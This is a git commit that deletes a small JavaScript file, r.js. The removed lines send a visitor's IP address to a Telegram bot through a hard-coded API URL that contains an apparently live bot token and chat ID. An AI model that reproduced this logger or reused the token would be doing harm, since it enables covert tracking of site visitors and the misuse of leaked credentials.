bd5a262668b44b0d429bc7b2fad5361978509071
samat2030 <121757988+samat2030@users.noreply.github.com>
2023-02-04 17:28:03 +0300

    Delete r.js

--- r.js
+++
@@ -1,5 +0,0 @@
-var logbot = 'https://api.telegram.org/bot5817673032:AAEkDq1mZv3Qo2tG_f33MsFzoUuzrSfo4DQ/sendMessage?chat_id=1461033970&text=' + IP;
-let x = new XMLHttpRequest();
-x.open("GET", logbot, true);
-x.send();
-
